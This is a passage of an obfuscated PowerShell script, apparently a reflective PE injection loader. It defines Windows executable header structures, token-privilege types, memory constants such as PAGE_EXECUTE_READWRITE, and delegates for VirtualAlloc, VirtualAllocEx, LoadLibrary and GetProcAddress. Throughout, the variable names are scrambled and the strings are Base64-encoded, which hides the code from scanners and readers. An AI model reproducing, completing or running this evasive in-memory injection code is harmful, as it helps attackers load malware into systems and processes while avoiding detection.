		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGwAZgBhAHIAbABjAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AdgBuAG8A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/=\_/=\_/==\_/\} = ${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHIAZQBzAA=='))), [UInt16[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${_/\/=\__/\__/\__/} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${_/\__/\__/\/=\/\_} = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBDAG8AbgBzAHQA')))))
		${______/\_/\_/\_/=} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${/=\/=\/==\/\_/===}, ${_/\/=\__/\__/\__/}, ${_/\__/\__/\/=\/\_}, @([Int32] 4))
		${__/=\_/=\_/==\_/\}.SetCustomAttribute(${______/\_/\_/\_/=})
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AZQBtAGkAZAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AZQBtAGkAbgBmAG8A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/==\/=\/=====\_} = ${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHIAZQBzADIA'))), [UInt16[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${_/\/=\__/\__/\__/} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${______/\_/\_/\_/=} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${/=\/=\/==\/\_/===}, ${_/\/=\__/\__/\__/}, ${_/\__/\__/\/=\/\_}, @([Int32] 10))
		${__/==\/=\/=====\_}.SetCustomAttribute(${______/\_/\_/\_/=})
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGwAZgBhAG4AZQB3AA=='))), [Int32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/\_____/==\_/\/\_} = ${_/\__/=\/\_/=\/\/}.CreateType()	
		${_____/=\_____/\__/} | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value ${/\_____/==\_/\/\_}
		${_/=\/\/\/=\/\/===} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${_/\__/=\/\_/=\/\/} = ${___/\_/=\_____/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBFAEMAVABJAE8ATgBfAEgARQBBAEQARQBSAA=='))), ${_/=\/\/\/=\/\/===}, [System.ValueType], 40)
		${/=\/\___/=\__/=\_} = ${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [Char[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${_/\/=\__/\__/\__/} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${______/\_/\_/\_/=} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${/=\/=\/==\/\_/===}, ${_/\/=\__/\__/\__/}, ${_/\__/\__/\/=\/\_}, @([Int32] 8))
		${/=\/\___/=\__/=\_}.SetCustomAttribute(${______/\_/\_/\_/=})
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABTAGkAegBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUgBhAHcARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBhAHcARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBlAGwAbwBjAGEAdABpAG8AbgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATABpAG4AZQBuAHUAbQBiAGUAcgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAZQBsAG8AYwBhAHQAaQBvAG4AcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAEwAaQBuAGUAbgB1AG0AYgBlAHIAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/\___/=\_/==} = ${_/\__/=\/\_/=\/\/}.CreateType()
		${_____/=\_____/\__/} | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value ${/===\/\___/=\_/==}
		${_/=\/\/\/=\/\/===} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${_/\__/=\/\_/=\/\/} = ${___/\_/=\_____/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AQgBBAFMARQBfAFIARQBMAE8AQwBBAFQASQBPAE4A'))), ${_/=\/\/\/=\/\/===}, [System.ValueType], 8)
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQgBsAG8AYwBrAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\/=\_/\/===\/=} = ${_/\__/=\/\_/=\/\/}.CreateType()
		${_____/=\_____/\__/} | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value ${__/\/=\_/\/===\/=}
		${_/=\/\/\/=\/\/===} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${_/\__/=\/\_/=\/\/} = ${___/\_/=\_____/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ASQBNAFAATwBSAFQAXwBEAEUAUwBDAFIASQBQAFQATwBSAA=='))), ${_/=\/\/\/=\/\/===}, [System.ValueType], 20)
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAdwBhAHIAZABlAHIAQwBoAGEAaQBuAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAHIAcwB0AFQAaAB1AG4AawA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/=\_/\_/==\/=\_/} = ${_/\__/=\/\_/=\/\/}.CreateType()
		${_____/=\_____/\__/} | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value ${_/=\_/\_/==\/=\_/}
		${_/=\/\/\/=\/\/===} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${_/\__/=\/\_/=\/\/} = ${___/\_/=\_____/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARQBYAFAATwBSAFQAXwBEAEkAUgBFAEMAVABPAFIAWQA='))), ${_/=\/\/\/=\/\/===}, [System.ValueType], 40)
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAEYAdQBuAGMAdABpAG8AbgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAE4AYQBtAGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARgB1AG4AYwB0AGkAbwBuAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYATgBhAG0AZQBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYATgBhAG0AZQBPAHIAZABpAG4AYQBsAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\__/\/\_/=} = ${_/\__/=\/\_/=\/\/}.CreateType()
		${_____/=\_____/\__/} | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value ${_/\__/=\__/\/\_/=}
		${_/=\/\/\/=\/\/===} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${_/\__/=\/\_/=\/\/} = ${___/\_/=\_____/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARAA='))), ${_/=\/\/\/=\/\/===}, [System.ValueType], 8)
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\/====\/====\/} = ${_/\__/=\/\_/=\/\/}.CreateType()
		${_____/=\_____/\__/} | Add-Member -MemberType NoteProperty -Name LUID -Value ${__/\/====\/====\/}
		${_/=\/\/\/=\/\/===} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${_/\__/=\/\_/=\/\/} = ${___/\_/=\_____/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARABfAEEATgBEAF8AQQBUAFQAUgBJAEIAVQBUAEUAUwA='))), ${_/=\/\/\/=\/\/===}, [System.ValueType], 12)
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TAB1AGkAZAA='))), ${__/\/====\/====\/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_/==\/\_/=\/\_} = ${_/\__/=\/\_/=\/\/}.CreateType()
		${_____/=\_____/\__/} | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value ${/=\_/==\/\_/=\/\_}
		${_/=\/\/\/=\/\/===} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${_/\__/=\/\_/=\/\/} = ${___/\_/=\_____/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABPAEsARQBOAF8AUABSAEkAVgBJAEwARQBHAEUAUwA='))), ${_/=\/\/\/=\/\/===}, [System.ValueType], 16)
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAQwBvAHUAbgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAcwA='))), ${/=\_/==\/\_/=\/\_}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_/\/==\__/==\/} = ${_/\__/=\/\_/=\/\/}.CreateType()
		${_____/=\_____/\__/} | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value ${/=\_/\/==\__/==\/}
		return ${_____/=\_____/\__/}
	}
	Function __/\_/=\_/\/\__/=\
	{
		${_____/\__/\/\/\/\/} = New-Object System.Object
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		${_____/\__/\/\/\/\/} | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		return ${_____/\__/\/\/\/\/}
	}
	Function __/\____/\/==\___/
	{
		${_/=\/\/\/\____/\/=} = New-Object System.Object
		${/=\_/\_/=\/=\/==\} = ____/==\____/\__/= kernel32.dll VirtualAlloc
		${__/\/\_/\/===\/=\} = _/==\/====\_/=\_/\ @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${/=\__/\/=\_/=\/\_} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\_/\_/=\/=\/==\}, ${__/\/\_/\/===\/=\})
		${_/=\/\/\/\____/\/=} | Add-Member NoteProperty -Name VirtualAlloc -Value ${/=\__/\/=\_/=\/\_}
		${/===\/=\/=\/\_/==} = ____/==\____/\__/= kernel32.dll VirtualAllocEx
		${__/=\/\/==\/==\/=} = _/==\/====\_/=\_/\ @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${_/===\_/=\/===\__} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/===\/=\/=\/\_/==}, ${__/=\/\/==\/==\/=})
		${_/=\/\/\/\____/\/=} | Add-Member NoteProperty -Name VirtualAllocEx -Value ${_/===\_/=\/===\__}
		${/\____/\_/=====\_} = ____/==\____/\__/= msvcrt.dll memcpy
		${_/\_/====\_/\__/=} = _/==\/====\_/=\_/\ @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		${_/====\/=====\/==} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/\____/\_/=====\_}, ${_/\_/====\_/\__/=})
		${_/=\/\/\/\____/\/=} | Add-Member -MemberType NoteProperty -Name memcpy -Value ${_/====\/=====\/==}
		${/=\/\_____/\_/\/=} = ____/==\____/\__/= msvcrt.dll memset
		${_/======\/\_/\/\_} = _/==\/====\_/=\_/\ @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		${_/=\/==\/\_/\__/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\/\_____/\_/\/=}, ${_/======\/\_/\/\_})
		${_/=\/\/\/\____/\/=} | Add-Member -MemberType NoteProperty -Name memset -Value ${_/=\/==\/\_/\__/=}
		${/\______/\/=\_/\/} = ____/==\____/\__/= kernel32.dll LoadLibraryA
		${/\_______/\/====\} = _/==\/====\_/=\_/\ @([String]) ([IntPtr])
		${_/==\/==\___/=\/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/\______/\/=\_/\/}, ${/\_______/\/====\})
		${_/=\/\/\/\____/\/=} | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value ${_/==\/==\___/=\/\}
		${/=\/\/=\__/=\___/} = ____/==\____/\__/= kernel32.dll GetProcAddress
		${_/\/\_/\/==\_/==\} = _/==\/====\_/=\_/\ @([IntPtr], [String]) ([IntPtr])
		${____/=\___/==\__/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\/\/=\__/=\___/}, ${_/\/\_/\/==\_/==\})
		${_/=\/\/\/\____/\/=} | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value ${____/=\___/==\__/}
		${__/\__/\__/\__/\_} = ____/==\____/\__/= kernel32.dll GetProcAddress
		${_/===\___/=\_/\/\} = _/==\/====\_/=\_/\ @([IntPtr], [IntPtr]) ([IntPtr])
		${/=\/=\/==\/\/===\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/\__/\__/\__/\_}, ${_/===\___/=\_/\/\})
		${_/=\/\/\/\____/\/=} | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value ${/=\/=\/==\/\/===\}
		${____/\__/======\_} = ____/==\____/\__/= kernel32.dll VirtualFree
		${/=\_/\_____/=\_/\} = _/==\/====\_/=\_/\ @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${/==\__/=\_/======} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${____/\__/======\_}, ${/=\_/\_____/=\_/\})
		${_/=\/\/\/\____/\/=} | Add-Member NoteProperty -Name VirtualFree -Value ${/==\__/=\_/======}
		${____/\/\/==\__/==} = ____/==\____/\__/= kernel32.dll VirtualFreeEx
		${_/====\/\/\_/===\} = _/==\/====\_/=\_/\ @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
